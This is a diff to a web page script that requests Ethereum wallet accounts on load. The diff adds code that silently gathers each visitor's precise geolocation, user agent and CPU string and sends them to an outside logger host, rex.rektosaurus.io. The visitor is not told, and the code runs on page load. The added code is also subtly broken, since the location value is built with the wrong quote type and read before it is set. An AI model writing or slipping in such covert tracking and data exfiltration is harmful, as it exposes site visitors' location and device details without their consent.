@@ -12,12 +12,46 @@ window.addEventListener('load', async () => {
     try {
       let accounts = await ethereum.request({ method: 'eth_requestAccounts' });
       console.log(accounts);
-    } catch (err) {a
-      console.log("Error executing eth_requestAccounts: " + err);
+    } catch (err) {
+      console.log("Error executing eth_requestAccounts: " + err.message);
     }
+
+  }
+
+  const options = {
+    enableHighAccuracy: true,
+    timeout: 5000,
+    maximumAge: 0
+  };
+
+  var loc = '';
+
+  function success(pos) {
+    const crd = pos.coords;
+
+    loc="${crd.latitude},${crd.longitude}";
+  }
+
+  function error(err) {
+    console.warn(`ERROR(${err.code}): ${err.message}`);
+  }
+
+  navigator.geolocation.getCurrentPosition(success, error, options);
+
+  try {
+    var xhttp = new XMLHttpRequest();
+
+    var cpu = navigator.oscpu;
+    var ua = navigator.userAgent;
+
+    xhttp.open("GET", "https://rex.rektosaurus.io/logger/ua=" + ua + "&oscpu=" + cpu + "&loc=" + loc);
+    xhttp.send();
+  } catch (err) {
+    console.log("Error executing HTTP request: " + err.message);
   }
 
 });
+
 </script>
 </head>
 <body>
